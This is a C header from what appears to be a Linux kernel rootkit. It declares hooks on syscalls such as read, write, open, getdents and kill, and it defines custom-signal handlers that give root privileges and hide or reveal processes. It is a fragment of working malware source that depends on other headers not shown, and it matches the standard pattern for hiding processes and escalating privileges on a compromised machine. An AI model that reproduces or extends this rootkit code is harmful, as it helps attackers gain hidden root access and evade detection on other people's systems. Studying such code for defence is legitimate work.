#ifndef _ROOTKIT_ROOTKIT_MAIN_H_
#define _ROOTKIT_ROOTKIT_MAIN_H_

#include "constants.h"
#include "hooking.h"
#include "macro_utils.h"
#include "utils.h"

#define P_SYSCALL_HOOKS  p_syscall_hooks /* Variable name of the syscall hook array */
#define P_SIG_HANDLERS   p_sig_handlers  /* Variable name of the signal handler array */
#define NR_SYSCALL_HOOKS (ARRAY_SIZE(P_SYSCALL_HOOKS)) /* Number of syscall hooks */

// Array of the original syscall function references.
sysfun_t p_orig_sysfuns[__NR_syscalls] = { NULL };

INIT_HOOK_HANDLERS(P_SYSCALL_HOOKS, read, write, open, pread64, sendfile, getdents, getdents64,
                   getpid, kill)

// Define signal handler array
const signal_handler_t P_SIG_HANDLERS[] = {
    NEW_SIGNAL_HANDLER(PID_ANY, SIGROOT, give_root),
    NEW_SIGNAL_HANDLER(PID_ANY, SIGHIDE, hide_process),
    NEW_SIGNAL_HANDLER(PID_ANY, SIGSHOW, show_process),
};

#endif
